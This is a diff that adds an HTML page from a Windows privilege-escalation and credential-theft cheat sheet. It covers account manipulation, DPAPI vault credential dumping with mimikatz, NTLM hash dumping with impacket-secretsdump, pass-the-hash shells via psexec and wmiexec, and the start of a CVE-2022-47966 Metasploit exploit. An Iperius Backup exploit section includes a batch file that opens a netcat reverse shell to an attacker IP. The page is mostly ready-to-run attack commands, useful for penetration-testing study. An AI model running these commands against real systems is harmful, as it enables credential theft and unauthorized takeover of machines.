@@ -1,0 +1,1957 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Activate Administrator Account on Windows - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Activate Administrator Account on Windows", url: "#_top", children: [
+              {title: "Add/Edit/Delete Users on Windows", url: "#addeditdelete-users-on-windows" },
+          ]},
+          {title: "Dumping Credentials from Windows Vault", url: "#dumping-credentials-from-windows-vault", children: [
+          ]},
+          {title: "Dumping Windows Password Hashes", url: "#dumping-windows-password-hashes", children: [
+              {title: "Commands", url: "#commands" },
+          ]},
+          {title: "Iperius Backup Service Privilege Escalation", url: "#iperius-backup-service-privilege-escalation", children: [
+              {title: "Investigation", url: "#investigation" },
+              {title: "Exploitation", url: "#exploitation" },
+          ]},
+          {title: "Login Windows Shell", url: "#login-windows-shell", children: [
+              {title: "Impacket PsExec", url: "#impacket-psexec" },
+              {title: "Impacket WmiExec", url: "#impacket-wmiexec" },
+          ]},
+          {title: "ManageEngine ADSelfService Plus PrivEsc", url: "#manageengine-adselfservice-plus-privesc", children: [
+              {title: "Directories", url: "#directories" },
+              {title: "Unauthenticated SAML RCE (CVE-2022-47966)", url: "#unauthenticated-saml-rce-cve-2022-47966" },
+          ]},
+          {title: "Mimikatz", url: "#mimikatz", children: [
+              {title: "Usage", url: "#usage" },
+          ]},
+          {title: "Outlook Reminder Privilege Escalation", url: "#outlook-reminder-privilege-escalation", children: [
+              {title: "Exploitation", url: "#exploitation_1" },
+          ]},
+          {title: "Switch User on Windows", url: "#switch-user-on-windows", children: [
+              {title: "Runas", url: "#runas" },
+              {title: "RunasCS", url: "#runascs" },
+          ]},
+          {title: "UAC Windows Privilege Escalation", url: "#uac-windows-privilege-escalation", children: [
+              {title: "Automation", url: "#automation" },
+              {title: "Investigation", url: "#investigation_1" },
+              {title: "UAC Bypass", url: "#uac-bypass" },
+              {title: "Abuse UAC Windows Certificate Dialog (CVE-2019-1388)", url: "#abuse-uac-windows-certificate-dialog-cve-2019-1388" },
+          ]},
+          {title: "Windows Privilege Escalation", url: "#windows-privilege-escalation", children: [
+              {title: "Automation", url: "#automation_1" },
+              {title: "LOLBAS (Living Off the Land Binaries, Scripts and Libraries)", url: "#lolbas-living-off-the-land-binaries-scripts-and-libraries" },
+              {title: "OS Information", url: "#os-information" },
+              {title: "Interesting Information", url: "#interesting-information" },
+              {title: "Recent Files", url: "#recent-files" },
+              {title: "Running Services", url: "#running-services" },
+              {title: "Running Processes", url: "#running-processes" },
+              {title: "Histories", url: "#histories" },
+              {title: "VSS (Volume Shadow Copy Service)", url: "#vss-volume-shadow-copy-service" },
+              {title: "Registry Keys", url: "#registry-keys" },
+              {title: "Sensitive Information", url: "#sensitive-information" },
+              {title: "Open Ports", url: "#open-ports" },
+              {title: "Getting All Local Users/Groups", url: "#getting-all-local-usersgroups" },
+              {title: "Change File Permission", url: "#change-file-permission" },
+              {title: "Take Ownership of a File (Administrators Group Required)", url: "#take-ownership-of-a-file-administrators-group-required" },
+              {title: "All Privs for Local Service, Network Service Account", url: "#all-privs-for-local-service-network-service-account" },
+              {title: "Event Logs", url: "#event-logs" },
+              {title: "Tasks", url: "#tasks" },
+              {title: "Sysinternals", url: "#sysinternals" },
+          ]},
+          {title: "Windows PrivEsc with AD CS", url: "#windows-privesc-with-ad-cs", children: [
+              {title: "Enumerate Certificate Templates", url: "#enumerate-certificate-templates" },
+              {title: "ESC1", url: "#esc1" },
+              {title: "ESC2", url: "#esc2" },
+              {title: "ESC3", url: "#esc3" },
+              {title: "ESC4", url: "#esc4" },
+              {title: "ESC6", url: "#esc6" },
+              {title: "ESC7", url: "#esc7" },
+              {title: "ESC8", url: "#esc8" },
+              {title: "Privilege Escalation with Microsoft Management Console (MMC)", url: "#privilege-escalation-with-microsoft-management-console-mmc" },
+              {title: "Add Computer and PrivEsc", url: "#add-computer-and-privesc" },
+          ]},
+          {title: "Replace 10.0.0.1 with your local ip", url: "#replace-10001-with-your-local-ip", children: [
+          ]},
+          {title: "Replace 10.0.0.1 with your ip", url: "#replace-10001-with-your-ip", children: [
+          ]},
+          {title: "Evil-WinRM", url: "#evil-winrm", children: [
+          ]},
+          {title: "-------------------------", url: "#-", children: [
+          ]},
+          {title: "Result", url: "#result", children: [
+          ]},
+          {title: "-------------------------", url: "#-_1", children: [
+          ]},
+          {title: "Result", url: "#result_1", children: [
+          ]},
+          {title: "------------------", url: "#-_2", children: [
+          ]},
+          {title: "Result", url: "#result_2", children: [
+          ]},
+          {title: "----------------------", url: "#-_3", children: [
+          ]},
+          {title: "Result (copy the id)", url: "#result-copy-the-id", children: [
+          ]},
+          {title: "Paste the objectsid which was copied in previous section.", url: "#paste-the-objectsid-which-was-copied-in-previous-section", children: [
+          ]},
+          {title: "Evil-WinRM", url: "#evil-winrm_1", children: [
+          ]},
+          {title: "-------------------------", url: "#-_4", children: [
+          ]},
+          {title: "Result (copy the rc4 hash)", url: "#result-copy-the-rc4-hash", children: [
+          ]},
+          {title: "--------------", url: "#-_5", children: [
+          ]},
+          {title: "Result (copy the output long hash at the last)", url: "#result-copy-the-output-long-hash-at-the-last", children: [
+          ]},
+          {title: "HKLM: HKEY_LOCAL_MACHINE", url: "#hklm-hkey_local_machine", children: [
+          ]},
+          {title: "Find user credentials", url: "#find-user-credentials", children: [
+          ]},
+          {title: "HKU: HKEY_USERS", url: "#hku-hkey_users", children: [
+          ]},
+          {title: "HKCU: HKEY_CURRENT_USER", url: "#hkcu-hkey_current_user", children: [
+          ]},
+          {title: "save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file.", url: "#save-saves-a-copy-of-specified-subkeys-entries-and-values-of-the-registry-in-a-specified-file", children: [
+          ]},
+          {title: "HKLM: HKEY_LOCAL_MACHINE", url: "#hklm-hkey_local_machine_1", children: [
+          ]},
+          {title: "Hashcat", url: "#hashcat", children: [
+          ]},
+          {title: "-m 1000: mode NTLM", url: "#-m-1000-mode-ntlm", children: [
+          ]},
+          {title: "John The Ripper", url: "#john-the-ripper", children: [
+          ]},
+          {title: "In attack machine", url: "#in-attack-machine", children: [
+          ]},
+          {title: "In target machine", url: "#in-target-machine", children: [
+          ]},
+          {title: "-m 0: Module (Rpc2Http cross protocol relay server + potato trigger)", url: "#-m-0-module-rpc2http-cross-protocol-relay-server-potato-trigger", children: [
+          ]},
+          {title: "-r: Remote HTTP relay server", url: "#-r-remote-http-relay-server", children: [
+          ]},
+          {title: "-x: Rogue Oxid resolver ip", url: "#-x-rogue-oxid-resolver-ip", children: [
+          ]},
+          {title: "-p: Rogue Oxid resolver port", url: "#-p-rogue-oxid-resolver-port", children: [
+          ]},
+          {title: "-s: Session id for the Cross Session Activation Attack", url: "#-s-session-id-for-the-cross-session-activation-attack", children: [
+          ]},
+          {title: "-l: RPC Relay server listening port", url: "#-l-rpc-relay-server-listening-port", children: [
+          ]},
+          {title: "If powershell,", url: "#if-powershell", children: [
+          ]},
+          {title: "If winrm,", url: "#if-winrm", children: [
+          ]},
+          {title: "If powershell,", url: "#if-powershell_1", children: [
+          ]},
+          {title: "If winrm,", url: "#if-winrm_1", children: [
+          ]},
+          {title: "/s: Specify the script file", url: "#s-specify-the-script-file", children: [
+          ]},
+          {title: "If powershell,", url: "#if-powershell_2", children: [
+          ]},
+          {title: "If winrm", url: "#if-winrm_2", children: [
+          ]},
+          {title: "Restart", url: "#restart", children: [
+          ]},
+          {title: "or PowerShell\u0027s command", url: "#or-powershells-command", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="activate-administrator-account-on-windows">Activate Administrator Account on Windows</h1>
+<p>Open PowerShell as <strong>Administrator</strong>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>net user administrator /active:yes
+</span></code></pre></div>
+<p>Now you can sign in to Administrator account.</p>
+<p>After that, you should disable Administrator account as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>net user administrator /active:no
+</span></code></pre></div>
+<h2 id="addeditdelete-users-on-windows">Add/Edit/Delete Users on Windows</h2>
+<h3 id="add-new-user">Add New User</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>net user /add &lt;username&gt; &lt;password&gt;
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>net user /add /domain &lt;username&gt; &lt;password&gt;
+</span></code></pre></div>
+<h3 id="with-secure-string-password">with Secure String Password</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$Username = &quot;John&quot;
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>$Password = ConvertTo-SecureString &quot;MyPassword123@&quot; -AsPlainText -Force
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>$FullName = &quot;John Doe&quot;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>$Description = &quot;My new account&quot;
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>$HomeDir = &quot;C:\Users\John&quot;
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a># Create new user
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>New-LocalUser -Name $Username -Password $Password -FullName $FullName -Description $Description -PasswordNeverExpires
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a># Add to &quot;Users&quot; local group
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Add-LocalGroupMember -Group Users -Member $Username
+</span></code></pre></div>
+<p>Now reboot Windows computer and you can sign in the new account.</p>
+<p><br /></p>
+<h3 id="add-user-to-local-group">Add User to Local Group</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Add to the Administrators group.
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>net localgroup Administrators &lt;username&gt; /add
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a># Add to the WinRM group.
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>net localgroup &quot;Remote Managment Users&quot; &lt;username&gt; /add
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a># Add to the RDP group.
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>net localgroup &quot;Remote Desktop Users&quot; &lt;username&gt; /add
+</span></code></pre></div>
+<p>If we could add an user to the WinRM or RDP group, we can login <strong>WinRM</strong> or <strong>RDP</strong> with the user credential.</p>
+<p><br /></p>
+<h3 id="change-user-password">Change User Password</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>net user &lt;username&gt; &lt;new-password&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="delete-user">Delete User</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>net user &lt;username&gt; /delete
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="delete-user-from-local-group">Delete User From Local Group</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># Delete from the Administrators group.
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>net localgroup Administrators &lt;username&gt; /delete
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a># Delete from the WinRM group.
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>net localgroup &quot;Remote Management Users&quot; &lt;username&gt; /delete
+</span></code></pre></div>
+<h1 id="dumping-credentials-from-windows-vault">Dumping Credentials from Windows Vault</h1>
+<p>We may be able to retrieve credentials if Windows Vault credentials are stored some folders.</p>
+<div class="language-text highlight"><pre><span></span><code>- [dpapi-extracting-passwords](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
+- [tools.thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/vault/cred)
+</code></pre></div>
+<ol>
+<li>Enumerate Credentials</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># Under %APPDATA% folder
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Credentials\
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Credentials\
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a># Under %LOCALAPPDATA% folder
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\
+</span></code></pre></div>
+<ol>
+<li>Dump Credential Information</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>mimikatz # dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Credentials\123ABC...
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a># or
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>mimikatz # dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\123ABC...
+</span></code></pre></div>
+<p>We can retrieve the <code>guidMasterKey</code> value that is used for the next section.</p>
+<ol>
+<li>Decrypt MasterKey</li>
+</ol>
+<p>The DPAPI keys are stored under <code>%APPDATA%\Microsofr\Protect\</code> or <code>%LOCALAPPDATA%\Microsoft\Protect\</code> folder. These keys are used for encrypting</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Under %APPDATA%
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>dir C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\{SID}\
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\{SID}\
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>dir C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\{SID}\
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a># Under %LOCALAPPDATA%
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>dir C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>Get-ChildItem C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\{SID}\
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>Get-ChildItem -Hidden C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\{SID}\
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>dir  C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Protect\{SID}\
+</span></code></pre></div>
+<p>Now decrypt the master keys:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># /rpc: Remotely decrypt the MasterKey
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>mimikatz # dpapi::masterkey /in:C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\{SID}\{STRING} /rpc
+</span></code></pre></div>
+<p>We can get the <code>key</code> value that is the decrypted Master Key.</p>
+<ol>
+<li>Dump Credentials</li>
+</ol>
+<p>We can dump credentials using the collected Credential value and decrypted Master Key (domainkey).</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># Specify &#39;/&lt;guidMasterKey&gt;::&lt;masterkey&gt;&#39;
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>mimikatz # dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\123ABC... /01234567-890abcde...::abcdef...
+</span></code></pre></div>
+<h1 id="dumping-windows-password-hashes">Dumping Windows Password Hashes</h1>
+<p>Using Impacket's SecretsDump, we can dump the Windows password hashes.</p>
+<ul>
+<li><a href="https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/">Impacket-SecretsDump</a></li>
+</ul>
+<h2 id="commands">Commands</h2>
+<h3 id="using-credentials">Using Credentials</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>impacket-secretsdump example.local/username:password@&lt;target-ip&gt;
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a># -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys).
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>impacket-secretsdump -just-dc example.local/username:password@&lt;target-ip&gt;
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a># -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only).
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>impacket-secretsdump -just-dc-ntlm example.local/username:password@&lt;target-ip&gt;
+</span></code></pre></div>
+<h3 id="using-ntds-file-or-hives">Using NTDS file or Hives</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># -ntds: NTDS.DIT file to parse
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a># -system: SYSTEM hive to parse
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a># -sam: SAM hive to parse
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a># -security: SECURITY hive to parse
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a># -system: SYSTEM hive to parse
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
+</span></code></pre></div>
+<p>After dumping, we can crack them to reveal passwords or use them with <strong>Pass-The-Hash</strong>.</p>
+<h1 id="iperius-backup-service-privilege-escalation">Iperius Backup Service Privilege Escalation</h1>
+<p>Iperius Backup Service is a database backup software. It is vulnerable to privilege escalation in Windows.</p>
+<h2 id="investigation">Investigation</h2>
+<p>First check if Iperius is running in target machine.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>wmic service list | findstr &quot;Iperius&quot;
+</span></code></pre></div>
+<p>If the Iperius service is running, we can gain access to administrator privilege.</p>
+<p><br /></p>
+<h2 id="exploitation">Exploitation</h2>
+<ol>
+<li>Create a Payload</li>
+</ol>
+<p>In target machine, create a <strong>.bat</strong> file named "exploit.bat".</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>@echo off
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>C:\Users\&lt;USERNAME&gt;\Downloads\nc.exe &lt;attack_machine_ip&gt; 1337 -e exploit.exe
+</span></code></pre></div>
+<p>Then place it to Desktop.<br />
+When saving, be sure to save it as the file type <strong>"All Files"</strong> (<strong>NOT .txt</strong>).</p>
+<p>After that start a listener in local machine.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<ol>
+<li>
+<p>Create a New Backup in Iperius**</p>
+</li>
+<li>
+<p>Click <strong>"Iperius"</strong> icon in Windows Explorer (the common path is <strong>C:\Program Files (x86)\Iperius Backup\Iperius</strong>).</p>
+</li>
+<li>Right click the <strong>"Iperius"</strong> icon on the right-bottom of the bar to open it.</li>
+<li>Click <strong>"Create New Backup"</strong> and select <strong>"Add Folder"</strong>.</li>
+<li>Enter path (<strong>c:\Users\&lt;USERNAME&gt;\Documents</strong>) and click <strong>"OK"</strong>.</li>
+<li>Navigate to <strong>"Destination"</strong> tab and select <strong>"Add Destination Folder"</strong>.</li>
+<li>Enter path (<strong>c:\Users\&lt;USERNAME&gt;\Descktop</strong>) and click <strong>"OK"</strong>.</li>
+<li>Navigate to <strong>"Other Processes"</strong> tab.</li>
+<li>
+<p>On <strong>"Before backup"</strong> section, check <strong>"Run a program or open external file:"</strong> and select <strong>"exploit.bat"</strong> file.</p>
+</li>
+<li>
+<p>Run the Backup</p>
+</li>
+</ol>
+<p>After setting a new backup, we can run it.<br />
+On <strong>"Iperius Backup"</strong> window, right-click on backup jobs <strong>"Documents"</strong> and select <strong>"Run backup as service"</strong> then click <strong>"OK"</strong> on the dialog.</p>
+<p>Now we should get a shell in local machine.</p>
+<h1 id="login-windows-shell">Login Windows Shell</h1>
+<p>If we have credentials for target Windows system, we can execute commands from Linux machine.</p>
+<h2 id="impacket-psexec">Impacket PsExec</h2>
+<p>PsExec gives us an interactive shell on the Windows host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>impacket-psexec username:password@&lt;target-ip&gt;
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># Pass the Hashes
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="impacket-wmiexec">Impacket WmiExec</h2>
+<p>WmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>impacket-wmiexec example.local/username@10.0.0.1
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a># Pass the Hashes
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
+</span></code></pre></div>
+<h1 id="manageengine-adselfservice-plus-privesc">ManageEngine ADSelfService Plus PrivEsc</h1>
+<p>ADSelfService Plus is an integrated Active Directory Self-Service Password Management and Single Sign-on Solution that reduces password-related help desk calls. Default ports are 8888 (http) and 9251 (https).</p>
+<h2 id="directories">Directories</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="unauthenticated-saml-rce-cve-2022-47966">Unauthenticated SAML RCE (CVE-2022-47966)</h2>
+<p>Reference: <a href="https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/">https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/</a></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>msfconsole
